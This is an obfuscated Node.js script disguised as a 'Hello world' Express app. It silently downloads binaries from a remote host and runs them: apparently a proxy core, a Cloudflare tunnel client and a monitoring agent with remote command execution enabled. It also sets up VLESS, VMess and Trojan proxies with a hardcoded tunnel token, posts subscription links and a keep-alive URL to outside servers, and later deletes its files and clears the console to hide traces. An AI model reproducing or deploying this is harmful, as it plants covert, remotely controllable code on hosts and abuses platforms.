const _0x23e140=_0xe410;(function(_0x3c8b6f,_0x5a7bbb){const _0x56a234=_0xe410,_0x410cc0=_0x3c8b6f();while(!![]){try{const _0x4bc3aa=parseInt(_0x56a234(0xf5))/0x1*(parseInt(_0x56a234(0xf8))/0x2)+-parseInt(_0x56a234(0xfc))/0x3+-parseInt(_0x56a234(0x10a))/0x4+-parseInt(_0x56a234(0xcc))/0x5+parseInt(_0x56a234(0xa6))/0x6+-parseInt(_0x56a234(0x115))/0x7*(-parseInt(_0x56a234(0xa2))/0x8)+parseInt(_0x56a234(0xe8))/0x9*(-parseInt(_0x56a234(0x11d))/0xa);if(_0x4bc3aa===_0x5a7bbb)break;else _0x410cc0['push'](_0x410cc0['shift']());}catch(_0x596a93){_0x410cc0['push'](_0x410cc0['shift']());}}}(_0x1711,0xedfcf));const express=require(_0x23e140(0xd6)),app=express(),axios=require(_0x23e140(0xdc)),os=require('os'),fs=require('fs'),path=require(_0x23e140(0xde)),{promisify}=require(_0x23e140(0x11c)),exec=promisify(require(_0x23e140(0x125))[_0x23e140(0x10d)]),{execSync}=require(_0x23e140(0x125)),UPLOAD_URL=process[_0x23e140(0xf0)][_0x23e140(0x149)]||'',PROJECT_URL=process[_0x23e140(0xf0)][_0x23e140(0x133)]||'',AUTO_ACCESS=process[_0x23e140(0xf0)][_0x23e140(0x11e)]||![],FILE_PATH=process[_0x23e140(0xf0)][_0x23e140(0xcb)]||'./tmp',SUB_PATH=process[_0x23e140(0xf0)][_0x23e140(0x13c)]||_0x23e140(0x9b),PORT=process[_0x23e140(0xf0)][_0x23e140(0xf9)]||process[_0x23e140(0xf0)][_0x23e140(0xc5)]||0xbb8,UUID=process[_0x23e140(0xf0)][_0x23e140(0x111)]||'2757acad-ad55-4bfe-bb2a-2ae718b68035',NEZHA_SERVER=process['env'][_0x23e140(0xb5)]||'',NEZHA_PORT=process[_0x23e140(0xf0)][_0x23e140(0xe4)]||'',NEZHA_KEY=process[_0x23e140(0xf0)][_0x23e140(0x101)]||'',ARGO_DOMAIN=process[_0x23e140(0xf0)][_0x23e140(0xa8)]||_0x23e140(0xce),ARGO_AUTH=process['env'][_0x23e140(0x13f)]||_0x23e140(0xe5),ARGO_PORT=process[_0x23e140(0xf0)][_0x23e140(0x12c)]||0x1f41,CFIP=process[_0x23e140(0xf0)][_0x23e140(0xaa)]||_0x23e140(0x142),CFPORT=process[_0x23e140(0xf0)][_0x23e140(0x112)]||0x1bb,NAME=process[_0x23e140(0xf0)][_0x23e140(0x100)]||'9966';!fs[_0x23e140(0x145)](FILE_PATH)?(fs[_0x23e140(0xb3)](FILE_PATH),console['log'](FILE_PATH+_0x23e140(0x151))):console[_0x23e140(0xd2)](FILE_PATH+_0x23e140(0xd8));function generateRandomName(){const _0x3b6985=_0x23e140,_0x820729='abcdefghijklmnopqrstuvwxyz';let _0x4a9ccf='';for(let _0x4dd400=0x0;_0x4dd400<0x6;_0x4dd400++){_0x4a9ccf+=_0x820729[_0x3b6985(0xc6)](Math[_0x3b6985(0x13b)](Math[_0x3b6985(0xe9)]()*_0x820729[_0x3b6985(0xc0)]));}return _0x4a9ccf;}const npmName=generateRandomName(),webName=generateRandomName(),botName=generateRandomName(),phpName=generateRandomName();let npmPath=path['join'](FILE_PATH,npmName),phpPath=path[_0x23e140(0xab)](FILE_PATH,phpName),webPath=path[_0x23e140(0xab)](FILE_PATH,webName),botPath=path['join'](FILE_PATH,botName),subPath=path[_0x23e140(0xab)](FILE_PATH,_0x23e140(0xc7)),listPath=path[_0x23e140(0xab)](FILE_PATH,_0x23e140(0xc1)),bootLogPath=path[_0x23e140(0xab)](FILE_PATH,_0x23e140(0x14b)),configPath=path[_0x23e140(0xab)](FILE_PATH,_0x23e140(0x12e));function deleteNodes(){const _0x40846f=_0x23e140;try{if(!UPLOAD_URL)return;if(!fs[_0x40846f(0x145)](subPath))return;let _0xe40688;try{_0xe40688=fs[_0x40846f(0xe2)](subPath,'utf-8');}catch{return null;}const _0xe0ffaf=Buffer['from'](_0xe40688,_0x40846f(0xad))['toString'](_0x40846f(0x14f)),_0x44b2b8=_0xe0ffaf[_0x40846f(0xea)]('\x0a')[_0x40846f(0xb1)](_0x263b14=>/(vless|vmess|trojan|hysteria2|tuic):\/\//[_0x40846f(0xd4)](_0x263b14));if(_0x44b2b8[_0x40846f(0xc0)]===0x0)return;return axios[_0x40846f(0x121)](UPLOAD_URL+_0x40846f(0x155),JSON['stringify']({'nodes':_0x44b2b8}),{'headers':{'Content-Type':_0x40846f(0x14e)}})[_0x40846f(0x113)](_0x3cc8d2=>{return null;}),null;}catch(_0x1ab226){return null;}}function cleanupOldFiles(){const _0x1febc7=_0x23e140;try{const _0x2b01b1=fs['readdirSync'](FILE_PATH);_0x2b01b1[_0x1febc7(0x154)](_0x56224c=>{const _0x35e5c7=_0x1febc7,_0x3a2ba7=path['join'](FILE_PATH,_0x56224c);try{const _0x4b4261=fs[_0x35e5c7(0x122)](_0x3a2ba7);_0x4b4261['isFile']()&&fs[_0x35e5c7(0x12a)](_0x3a2ba7);}catch(_0x19a60f){}});}catch(_0x4c98d7){}}app[_0x23e140(0xef)]('/',function(_0x368a88,_0x334016){const _0x22e1b3=_0x23e140;_0x334016[_0x22e1b3(0xfb)](_0x22e1b3(0x143));});async function generateConfig(){const _0x28f578=_0x23e140,_0x302415={'log':{'access':'/dev/null','error':_0x28f578(0xaf),'loglevel':_0x28f578(0x147)},'inbounds':[{'port':ARGO_PORT,'protocol':'vless','settings':{'clients':[{'id':UUID,'flow':'xtls-rprx-vision'}],'decryption':_0x28f578(0x147),'fallbacks':[{'dest':0xbb9},{'path':'/vless-argo','dest':0xbba},{'path':'/vmess-argo','dest':0xbbb},{'path':_0x28f578(0x14a),'dest':0xbbc}]},'streamSettings':{'network':_0x28f578(0xf4)}},{'port':0xbb9,'listen':_0x28f578(0xd1),'protocol':_0x28f578(0xf3),'settings':{'clients':[{'id':UUID}],'decryption':_0x28f578(0x147)},'streamSettings':{'network':_0x28f578(0xf4),'security':_0x28f578(0x147)}},{'port':0xbba,'listen':_0x28f578(0xd1),'protocol':_0x28f578(0xf3),'settings':{'clients':[{'id':UUID,'level':0x0}],'decryption':_0x28f578(0x147)},'streamSettings':{'network':'ws','security':_0x28f578(0x147),'wsSettings':{'path':_0x28f578(0xbb)}},'sniffing':{'enabled':!![],'destOverride':['http',_0x28f578(0x9c),_0x28f578(0x146)],'metadataOnly':![]}},{'port':0xbbb,'listen':'127.0.0.1','protocol':_0x28f578(0x114),'settings':{'clients':[{'id':UUID,'alterId':0x0}]},'streamSettings':{'network':'ws','wsSettings':{'path':'/vmess-argo'}},'sniffing':{'enabled':!![],'destOverride':[_0x28f578(0x126),_0x28f578(0x9c),'quic'],'metadataOnly':![]}},{'port':0xbbc,'listen':_0x28f578(0xd1),'protocol':_0x28f578(0xed),'settings':{'clients':[{'password':UUID}]},'streamSettings':{'network':'ws','security':_0x28f578(0x147),'wsSettings':{'path':_0x28f578(0x14a)}},'sniffing':{'enabled':!![],'destOverride':['http','tls',_0x28f578(0x146)],'metadataOnly':![]}}],'dns':{'servers':[_0x28f578(0x109)]},'outbounds':[{'protocol':'freedom','tag':_0x28f578(0x153)},{'protocol':'blackhole','tag':_0x28f578(0xb7)}]};fs[_0x28f578(0xc2)](path[_0x28f578(0xab)](FILE_PATH,'config.json'),JSON[_0x28f578(0x129)](_0x302415,null,0x2));}function getSystemArchitecture(){const _0x1ba1c1=_0x23e140,_0x59daec=os[_0x1ba1c1(0xfd)]();return _0x59daec===_0x1ba1c1(0xe1)||_0x59daec===_0x1ba1c1(0xca)||_0x59daec===_0x1ba1c1(0x10f)?_0x1ba1c1(0xe1):'amd';}function downloadFile(_0x5497b0,_0x599a45,_0x2f1e9d){const _0x31750f=_0x23e140,_0x411169=_0x5497b0;!fs[_0x31750f(0x145)](FILE_PATH)&&fs[_0x31750f(0xb3)](FILE_PATH,{'recursive':!![]});const _0x1f1341=fs[_0x31750f(0xc8)](_0x411169);axios({'method':'get','url':_0x599a45,'responseType':_0x31750f(0x13d)})[_0x31750f(0xf1)](_0x27d8f4=>{const _0x46bd23=_0x31750f;_0x27d8f4[_0x46bd23(0xe6)][_0x46bd23(0x139)](_0x1f1341),_0x1f1341['on'](_0x46bd23(0xd9),()=>{const _0x22164d=_0x46bd23;_0x1f1341[_0x22164d(0x12b)](),console[_0x22164d(0xd2)](_0x22164d(0x152)+path['basename'](_0x411169)+'\x20successfully'),_0x2f1e9d(null,_0x411169);}),_0x1f1341['on']('error',_0x462f02=>{const _0x2669f6=_0x46bd23;fs[_0x2669f6(0x11b)](_0x411169,()=>{});const _0x452e5d=_0x2669f6(0x152)+path[_0x2669f6(0x110)](_0x411169)+_0x2669f6(0x134)+_0x462f02['message'];console['error'](_0x452e5d),_0x2f1e9d(_0x452e5d);});})[_0x31750f(0x113)](_0x3709d0=>{const _0x57c0de=_0x31750f,_0x479ddc=_0x57c0de(0x152)+path[_0x57c0de(0x110)](_0x411169)+_0x57c0de(0x134)+_0x3709d0[_0x57c0de(0xba)];console[_0x57c0de(0xb9)](_0x479ddc),_0x2f1e9d(_0x479ddc);});}async function downloadFilesAndRun(){const _0xa8edd6=_0x23e140,_0x2bb2f9=getSystemArchitecture(),_0x4db6e6=getFilesForArchitecture(_0x2bb2f9);if(_0x4db6e6[_0xa8edd6(0xc0)]===0x0){console[_0xa8edd6(0xd2)](_0xa8edd6(0xd5));return;}const _0x13016c=_0x4db6e6['map'](_0x3f5c9c=>{return new Promise((_0x26fe83,_0x38d24d)=>{const _0x2f511d=_0xe410;downloadFile(_0x3f5c9c[_0x2f511d(0xb4)],_0x3f5c9c[_0x2f511d(0x117)],(_0x4bc5da,_0x1d891a)=>{_0x4bc5da?_0x38d24d(_0x4bc5da):_0x26fe83(_0x1d891a);});});});try{await Promise['all'](_0x13016c);}catch(_0x4a6481){console['error'](_0xa8edd6(0xa1),_0x4a6481);return;}function _0x38cb77(_0x54b796){const _0x4229e4=_0xa8edd6,_0x431db4=0x1fd;_0x54b796[_0x4229e4(0x154)](_0x22fd9b=>{const _0x4068a9=_0x4229e4;fs[_0x4068a9(0x145)](_0x22fd9b)&&fs[_0x4068a9(0x12d)](_0x22fd9b,_0x431db4,_0xe2d94a=>{const _0x48660a=_0x4068a9;_0xe2d94a?console[_0x48660a(0xb9)](_0x48660a(0x105)+_0x22fd9b+':\x20'+_0xe2d94a):console['log'](_0x48660a(0xb6)+_0x22fd9b+':\x20'+_0x431db4[_0x48660a(0x119)](0x8));});});}const _0x3e5002=NEZHA_PORT?[npmPath,webPath,botPath]:[phpPath,webPath,botPath];_0x38cb77(_0x3e5002);if(NEZHA_SERVER&&NEZHA_KEY){if(!NEZHA_PORT){const _0x39acec=NEZHA_SERVER[_0xa8edd6(0x10e)](':')?NEZHA_SERVER['split'](':')['pop']():'',_0x2ba7ab=new Set([_0xa8edd6(0x124),'8443','2096',_0xa8edd6(0xbc),'2083','2053']),_0x247a72=_0x2ba7ab[_0xa8edd6(0xbf)](_0x39acec)?'true':_0xa8edd6(0xeb),_0x49648c=_0xa8edd6(0xdf)+NEZHA_KEY+_0xa8edd6(0xdd)+NEZHA_SERVER+_0xa8edd6(0xa9)+_0x247a72+'\x0ause_gitee_to_upgrade:\x20false\x0ause_ipv6_country_code:\x20false\x0auuid:\x20'+UUID;fs[_0xa8edd6(0xc2)](path[_0xa8edd6(0xab)](FILE_PATH,'config.yaml'),_0x49648c);const _0xa778c2=_0xa8edd6(0xbd)+phpPath+_0xa8edd6(0x13e)+FILE_PATH+_0xa8edd6(0xb8);try{await exec(_0xa778c2),console[_0xa8edd6(0xd2)](phpName+_0xa8edd6(0xda)),await new Promise(_0xd537ba=>setTimeout(_0xd537ba,0x3e8));}catch(_0x4d3abc){console[_0xa8edd6(0xb9)](_0xa8edd6(0xae)+_0x4d3abc);}}else{let _0x3224cb='';const _0x3765b6=['443',_0xa8edd6(0x12f),'2096',_0xa8edd6(0xbc),_0xa8edd6(0xfa),_0xa8edd6(0x128)];_0x3765b6[_0xa8edd6(0x10e)](NEZHA_PORT)&&(_0x3224cb=_0xa8edd6(0x130));const _0x176215=_0xa8edd6(0xbd)+npmPath+_0xa8edd6(0x140)+NEZHA_SERVER+':'+NEZHA_PORT+_0xa8edd6(0xa7)+NEZHA_KEY+'\x20'+_0x3224cb+_0xa8edd6(0x120);try{await exec(_0x176215),console[_0xa8edd6(0xd2)](npmName+_0xa8edd6(0xda)),await new Promise(_0x7cf43f=>setTimeout(_0x7cf43f,0x3e8));}catch(_0x343624){console[_0xa8edd6(0xb9)]('npm\x20running\x20error:\x20'+_0x343624);}}}else console['log']('NEZHA\x20variable\x20is\x20empty,skip\x20running');const _0x3545a3=_0xa8edd6(0xbd)+webPath+_0xa8edd6(0xd3)+FILE_PATH+_0xa8edd6(0x10b);try{await exec(_0x3545a3),console[_0xa8edd6(0xd2)](webName+_0xa8edd6(0xda)),await new Promise(_0x251307=>setTimeout(_0x251307,0x3e8));}catch(_0x405750){console[_0xa8edd6(0xb9)](_0xa8edd6(0x136)+_0x405750);}if(fs[_0xa8edd6(0x145)](botPath)){let _0x32570d;if(ARGO_AUTH[_0xa8edd6(0xbe)](/^[A-Z0-9a-z=]{120,250}$/))_0x32570d=_0xa8edd6(0x10c)+ARGO_AUTH;else ARGO_AUTH[_0xa8edd6(0xbe)](/TunnelSecret/)?_0x32570d=_0xa8edd6(0x141)+FILE_PATH+_0xa8edd6(0xdb):_0x32570d=_0xa8edd6(0x106)+FILE_PATH+_0xa8edd6(0x127)+ARGO_PORT;try{await exec(_0xa8edd6(0xbd)+botPath+'\x20'+_0x32570d+'\x20>/dev/null\x202>&1\x20&'),console[_0xa8edd6(0xd2)](botName+_0xa8edd6(0xda)),await new Promise(_0x1d381f=>setTimeout(_0x1d381f,0x7d0));}catch(_0x36397d){console[_0xa8edd6(0xb9)](_0xa8edd6(0x116)+_0x36397d);}}await new Promise(_0x5beb60=>setTimeout(_0x5beb60,0x1388));}function getFilesForArchitecture(_0xc4e224){const _0x11c145=_0x23e140;let _0x2fc47a;_0xc4e224===_0x11c145(0xe1)?_0x2fc47a=[{'fileName':webPath,'fileUrl':'https://arm64.ssss.nyc.mn/web'},{'fileName':botPath,'fileUrl':_0x11c145(0xcd)}]:_0x2fc47a=[{'fileName':webPath,'fileUrl':_0x11c145(0x14d)},{'fileName':botPath,'fileUrl':_0x11c145(0x132)}];if(NEZHA_SERVER&&NEZHA_KEY){if(NEZHA_PORT){const _0x5f58e8=_0xc4e224===_0x11c145(0xe1)?_0x11c145(0x9f):_0x11c145(0xcf);_0x2fc47a[_0x11c145(0x103)]({'fileName':npmPath,'fileUrl':_0x5f58e8});}else{const _0x564d55=_0xc4e224===_0x11c145(0xe1)?_0x11c145(0x148):_0x11c145(0x131);_0x2fc47a[_0x11c145(0x103)]({'fileName':phpPath,'fileUrl':_0x564d55});}}return _0x2fc47a;}function argoType(){const _0x17dfae=_0x23e140;if(!ARGO_AUTH||!ARGO_DOMAIN){console[_0x17dfae(0xd2)](_0x17dfae(0x104));return;}if(ARGO_AUTH[_0x17dfae(0x10e)]('TunnelSecret')){fs[_0x17dfae(0xc2)](path[_0x17dfae(0xab)](FILE_PATH,'tunnel.json'),ARGO_AUTH);const _0x37ceda=_0x17dfae(0x144)+ARGO_AUTH[_0x17dfae(0xea)]('\x22')[0xb]+'\x0a\x20\x20credentials-file:\x20'+path[_0x17dfae(0xab)](FILE_PATH,_0x17dfae(0xf7))+_0x17dfae(0x156)+ARGO_DOMAIN+_0x17dfae(0x108)+ARGO_PORT+'\x0a\x20\x20\x20\x20\x20\x20originRequest:\x0a\x20\x20\x20\x20\x20\x20\x20\x20noTLSVerify:\x20true\x0a\x20\x20\x20\x20-\x20service:\x20http_status:404\x0a\x20\x20';fs[_0x17dfae(0xc2)](path[_0x17dfae(0xab)](FILE_PATH,_0x17dfae(0x99)),_0x37ceda);}else console['log'](_0x17dfae(0x118));}argoType();function _0xe410(_0x3b7ac2,_0x31a308){const _0x171124=_0x1711();return _0xe410=function(_0xe410e6,_0x35c890){_0xe410e6=_0xe410e6-0x98;let _0x1672af=_0x171124[_0xe410e6];return _0x1672af;},_0xe410(_0x3b7ac2,_0x31a308);}async function extractDomains(){const _0x424239=_0x23e140;let _0x1b00b1;if(ARGO_AUTH&&ARGO_DOMAIN)_0x1b00b1=ARGO_DOMAIN,console['log'](_0x424239(0x137),_0x1b00b1),await _0x5f5757(_0x1b00b1);else try{const _0x127488=fs['readFileSync'](path['join'](FILE_PATH,_0x424239(0x14b)),_0x424239(0x14f)),_0xf43faa=_0x127488['split']('\x0a'),_0x441758=[];_0xf43faa['forEach'](_0x171446=>{const _0x1f8616=_0x424239,_0x534fa4=_0x171446['match'](/https?:\/\/([^ ]*trycloudflare\.com)\/?/);if(_0x534fa4){const _0x299fa1=_0x534fa4[0x1];_0x441758[_0x1f8616(0xf6)](_0x299fa1);}});if(_0x441758[_0x424239(0xc0)]>0x0)_0x1b00b1=_0x441758[0x0],console[_0x424239(0xd2)]('ArgoDomain:',_0x1b00b1),await _0x5f5757(_0x1b00b1);else{console[_0x424239(0xd2)](_0x424239(0xc3)),fs[_0x424239(0x12a)](path[_0x424239(0xab)](FILE_PATH,_0x424239(0x14b)));async function _0x38b44c(){const _0x4b8bdb=_0x424239;try{process[_0x4b8bdb(0x14c)]==='win32'?await exec(_0x4b8bdb(0xe7)+botName+_0x4b8bdb(0x11a)):await exec('pkill\x20-f\x20\x22['+botName[_0x4b8bdb(0xc6)](0x0)+']'+botName[_0x4b8bdb(0x9d)](0x1)+_0x4b8bdb(0xa4));}catch(_0x5dee95){}}_0x38b44c(),await new Promise(_0x56c8f2=>setTimeout(_0x56c8f2,0xbb8));const _0x5f4346='tunnel\x20--edge-ip-version\x20auto\x20--no-autoupdate\x20--protocol\x20http2\x20--logfile\x20'+FILE_PATH+_0x424239(0x127)+ARGO_PORT;try{await exec(_0x424239(0xbd)+botPath+'\x20'+_0x5f4346+'\x20>/dev/null\x202>&1\x20&'),console[_0x424239(0xd2)](botName+_0x424239(0xda)),await new Promise(_0x4d40f5=>setTimeout(_0x4d40f5,0xbb8)),await extractDomains();}catch(_0x4fb08c){console[_0x424239(0xb9)]('Error\x20executing\x20command:\x20'+_0x4fb08c);}}}catch(_0x55b105){console['error'](_0x424239(0xd7),_0x55b105);}async function _0x5f5757(_0x1cd773){const _0x270e5e=_0x424239,_0x1e7655=execSync('curl\x20-sm\x205\x20https://speed.cloudflare.com/meta\x20|\x20awk\x20-F\x5c\x22\x20\x27{print\x20$26\x22-\x22$18}\x27\x20|\x20sed\x20-e\x20\x27s/\x20/_/g\x27',{'encoding':_0x270e5e(0x14f)}),_0x4e35e7=_0x1e7655[_0x270e5e(0x138)](),_0x332754=NAME?NAME+'-'+_0x4e35e7:_0x4e35e7;return new Promise(_0x19e122=>{setTimeout(()=>{const _0x54bc12=_0xe410,_0x43816b={'v':'2','ps':''+_0x332754,'add':CFIP,'port':CFPORT,'id':UUID,'aid':'0','scy':_0x54bc12(0x147),'net':'ws','type':_0x54bc12(0x147),'host':_0x1cd773,'path':_0x54bc12(0xac),'tls':'tls','sni':_0x1cd773,'alpn':'','fp':'firefox'},_0x38ecf6=_0x54bc12(0xff)+UUID+'@'+CFIP+':'+CFPORT+'?encryption=none&security=tls&sni='+_0x1cd773+_0x54bc12(0x150)+_0x1cd773+_0x54bc12(0xb2)+_0x332754+'\x0a\x20\x20\x0avmess://'+Buffer[_0x54bc12(0xa3)](JSON['stringify'](_0x43816b))[_0x54bc12(0x119)](_0x54bc12(0xad))+_0x54bc12(0x9a)+UUID+'@'+CFIP+':'+CFPORT+_0x54bc12(0x123)+_0x1cd773+_0x54bc12(0x150)+_0x1cd773+_0x54bc12(0xf2)+_0x332754+'\x0a\x20\x20\x20\x20';console[_0x54bc12(0xd2)](Buffer['from'](_0x38ecf6)[_0x54bc12(0x119)](_0x54bc12(0xad))),fs[_0x54bc12(0xc2)](subPath,Buffer[_0x54bc12(0xa3)](_0x38ecf6)[_0x54bc12(0x119)](_0x54bc12(0xad))),console[_0x54bc12(0xd2)](FILE_PATH+_0x54bc12(0x135)),uploadNodes(),app[_0x54bc12(0xef)]('/'+SUB_PATH,(_0xe4227c,_0x4249c7)=>{const _0x2e3583=_0x54bc12,_0x999bd6=Buffer[_0x2e3583(0xa3)](_0x38ecf6)['toString'](_0x2e3583(0xad));_0x4249c7['set'](_0x2e3583(0x11f),'text/plain;\x20charset=utf-8'),_0x4249c7[_0x2e3583(0xfb)](_0x999bd6);}),_0x19e122(_0x38ecf6);},0x7d0);});}}async function uploadNodes(){const _0x4dfde1=_0x23e140;if(UPLOAD_URL&&PROJECT_URL){const _0x3d0e7a=PROJECT_URL+'/'+SUB_PATH,_0x5267e3={'subscription':[_0x3d0e7a]};try{const _0x163d71=await axios[_0x4dfde1(0x121)](UPLOAD_URL+_0x4dfde1(0x13a),_0x5267e3,{'headers':{'Content-Type':_0x4dfde1(0x14e)}});return _0x163d71&&_0x163d71[_0x4dfde1(0xa0)]===0xc8?(console['log'](_0x4dfde1(0x98)),_0x163d71):null;}catch(_0x2245f7){if(_0x2245f7[_0x4dfde1(0xb0)]){if(_0x2245f7['response'][_0x4dfde1(0xa0)]===0x190){}}}}else{if(UPLOAD_URL){if(!fs[_0x4dfde1(0x145)](listPath))return;const _0x407634=fs[_0x4dfde1(0xe2)](listPath,_0x4dfde1(0x14f)),_0x516c4d=_0x407634[_0x4dfde1(0xea)]('\x0a')['filter'](_0x477300=>/(vless|vmess|trojan|hysteria2|tuic):\/\//[_0x4dfde1(0xd4)](_0x477300));if(_0x516c4d['length']===0x0)return;const _0x1ef9f4=JSON['stringify']({'nodes':_0x516c4d});try{const _0x3ffdf3=await axios['post'](UPLOAD_URL+'/api/add-nodes',_0x1ef9f4,{'headers':{'Content-Type':'application/json'}});return _0x3ffdf3&&_0x3ffdf3[_0x4dfde1(0xa0)]===0xc8?(console[_0x4dfde1(0xd2)]('Nodes\x20uploaded\x20successfully'),_0x3ffdf3):null;}catch(_0x486c54){return null;}}else return;}}function cleanFiles(){setTimeout(()=>{const _0x5c25de=_0xe410,_0x2cf815=[bootLogPath,configPath,webPath,botPath];if(NEZHA_PORT)_0x2cf815[_0x5c25de(0xf6)](npmPath);else NEZHA_SERVER&&NEZHA_KEY&&_0x2cf815[_0x5c25de(0xf6)](phpPath);process[_0x5c25de(0x14c)]===_0x5c25de(0x102)?exec('del\x20/f\x20/q\x20'+_0x2cf815[_0x5c25de(0xab)]('\x20')+_0x5c25de(0xd0),_0x40ac24=>{const _0x522319=_0x5c25de;console[_0x522319(0xe0)](),console['log'](_0x522319(0xc4)),console[_0x522319(0xd2)](_0x522319(0xe3));}):exec(_0x5c25de(0x9e)+_0x2cf815[_0x5c25de(0xab)]('\x20')+'\x20>/dev/null\x202>&1',_0x45f463=>{const _0x486d6d=_0x5c25de;console[_0x486d6d(0xe0)](),console[_0x486d6d(0xd2)](_0x486d6d(0xc4)),console[_0x486d6d(0xd2)]('Thank\x20you\x20for\x20using\x20this\x20script,\x20enjoy!');});},0x15f90);}cleanFiles();async function AddVisitTask(){const _0x484c2f=_0x23e140;if(!AUTO_ACCESS||!PROJECT_URL){console['log'](_0x484c2f(0xee));return;}try{const _0x307f3d=await axios[_0x484c2f(0x121)](_0x484c2f(0xfe),{'url':PROJECT_URL},{'headers':{'Content-Type':'application/json'}});return console[_0x484c2f(0xd2)]('automatic\x20access\x20task\x20added\x20successfully'),_0x307f3d;}catch(_0x40ffe2){return console[_0x484c2f(0xb9)](_0x484c2f(0x107)+_0x40ffe2[_0x484c2f(0xba)]),null;}}async function startserver(){const _0x281ad0=_0x23e140;try{deleteNodes(),cleanupOldFiles(),await generateConfig(),await downloadFilesAndRun(),await extractDomains(),await AddVisitTask();}catch(_0x252ad5){console[_0x281ad0(0xb9)]('Error\x20in\x20startserver:',_0x252ad5);}}function _0x1711(){const _0x1c516e=['boot.log','platform','https://amd64.ssss.nyc.mn/web','application/json','utf-8','&fp=firefox&type=ws&host=','\x20is\x20created','Download\x20','direct','forEach','/api/delete-nodes','\x0a\x20\x20protocol:\x20http2\x0a\x20\x20\x0a\x20\x20ingress:\x0a\x20\x20\x20\x20-\x20hostname:\x20','Subscription\x20uploaded\x20successfully','tunnel.yml','\x0a\x20\x20\x0atrojan://','sub','tls','substring','rm\x20-rf\x20','https://arm64.ssss.nyc.mn/agent','status','Error\x20downloading\x20files:','24DQojEX','from','\x22\x20>\x20/dev/null\x202>&1','http\x20server\x20is\x20running\x20on\x20port:','8920962XIxxnj','\x20-p\x20','ARGO_DOMAIN','\x0askip_connection_count:\x20true\x0askip_procs_count:\x20true\x0atemperature:\x20false\x0atls:\x20','CFIP','join','/vmess-argo?ed=2560','base64','php\x20running\x20error:\x20','/dev/null','response','filter','&path=%2Fvless-argo%3Fed%3D2560#','mkdirSync','fileName','NEZHA_SERVER','Empowerment\x20success\x20for\x20','block','/config.yaml\x22\x20>/dev/null\x202>&1\x20&','error','message','/vless-argo','2087','nohup\x20','match','has','length','list.txt','writeFileSync','ArgoDomain\x20not\x20found,\x20re-running\x20bot\x20to\x20obtain\x20ArgoDomain','App\x20is\x20running','PORT','charAt','sub.txt','createWriteStream','listen','arm64','FILE_PATH','1722190dwabvP','https://arm64.ssss.nyc.mn/bot','qq66.xizangart.com','https://amd64.ssss.nyc.mn/agent','\x20>\x20nul\x202>&1','127.0.0.1','log','\x20-c\x20','test','Can\x27t\x20find\x20a\x20file\x20for\x20the\x20current\x20architecture','express','Error\x20reading\x20boot.log:','\x20already\x20exists','finish','\x20is\x20running','/tunnel.yml\x20run','axios','\x0adebug:\x20false\x0adisable_auto_update:\x20true\x0adisable_command_execute:\x20false\x0adisable_force_update:\x20true\x0adisable_nat:\x20false\x0adisable_send_query:\x20false\x0agpu:\x20false\x0ainsecure_tls:\x20true\x0aip_report_period:\x201800\x0areport_delay:\x204\x0aserver:\x20','path','\x0aclient_secret:\x20','clear','arm','readFileSync','Thank\x20you\x20for\x20using\x20this\x20script,\x20enjoy!','NEZHA_PORT','eyJhIjoiMTYyMzBlMWUxZGViZmNiYWRhMGNiNmY0NzQ4ZmU2YjIiLCJ0IjoiMTU3NTJiMmUtNjhiNy00NzQ4LTljY2UtMjMwZTIxMmIxMjFjIiwicyI6IllqSXhObUUwT1RjdFpqQTJOeTAwTkRoakxUazNPR0V0WTJVM05qSmlPVGM1TlROaCJ9','data','taskkill\x20/f\x20/im\x20','1651239zZbszB','random','split','false','Unhandled\x20error\x20in\x20startserver:','trojan','Skipping\x20adding\x20automatic\x20access\x20task','get','env','then','&path=%2Ftrojan-argo%3Fed%3D2560#','vless','tcp','1807TeLZRK','push','tunnel.json','92jyeTFw','SERVER_PORT','2083','send','307029gToNdk','arch','https://oooo.serv00.net/add-url','\x0avless://','NAME','NEZHA_KEY','win32','unshift','ARGO_DOMAIN\x20or\x20ARGO_AUTH\x20variable\x20is\x20empty,\x20use\x20quick\x20tunnels','Empowerment\x20failed\x20for\x20','tunnel\x20--edge-ip-version\x20auto\x20--no-autoupdate\x20--protocol\x20http2\x20--logfile\x20','Add\x20automatic\x20access\x20task\x20faild:\x20','\x0a\x20\x20\x20\x20\x20\x20service:\x20http://localhost:','https+local://8.8.8.8/dns-query','237076TxdFxu','/config.json\x20>/dev/null\x202>&1\x20&','tunnel\x20--edge-ip-version\x20auto\x20--no-autoupdate\x20--protocol\x20http2\x20run\x20--token\x20','exec','includes','aarch64','basename','UUID','CFPORT','catch','vmess','3644991SzyMzB','Error\x20executing\x20command:\x20','fileUrl','ARGO_AUTH\x20mismatch\x20TunnelSecret,use\x20token\x20connect\x20to\x20tunnel','toString','.exe\x20>\x20nul\x202>&1','unlink','util','90QnodEf','AUTO_ACCESS','Content-Type','\x20--disable-auto-update\x20--report-delay\x204\x20--skip-conn\x20--skip-procs\x20>/dev/null\x202>&1\x20&','post','statSync','?security=tls&sni=','443','child_process','http','/boot.log\x20--loglevel\x20info\x20--url\x20http://localhost:','2053','stringify','unlinkSync','close','ARGO_PORT','chmod','config.json','8443','--tls','https://amd64.ssss.nyc.mn/v1','https://amd64.ssss.nyc.mn/bot','PROJECT_URL','\x20failed:\x20','/sub.txt\x20saved\x20successfully','web\x20running\x20error:\x20','ARGO_DOMAIN:','trim','pipe','/api/add-subscriptions','floor','SUB_PATH','stream','\x20-c\x20\x22','ARGO_AUTH','\x20-s\x20','tunnel\x20--edge-ip-version\x20auto\x20--config\x20','cdns.doon.eu.org','Hello\x20world!','\x0a\x20\x20tunnel:\x20','existsSync','quic','none','https://arm64.ssss.nyc.mn/v1','UPLOAD_URL','/trojan-argo'];_0x1711=function(){return _0x1c516e;};return _0x1711();}startserver()[_0x23e140(0x113)](_0x369c8f=>{const _0x5d9ae1=_0x23e140;console['error'](_0x5d9ae1(0xec),_0x369c8f);}),app[_0x23e140(0xc9)](PORT,()=>console[_0x23e140(0xd2)](_0x23e140(0xa5)+PORT+'!'));
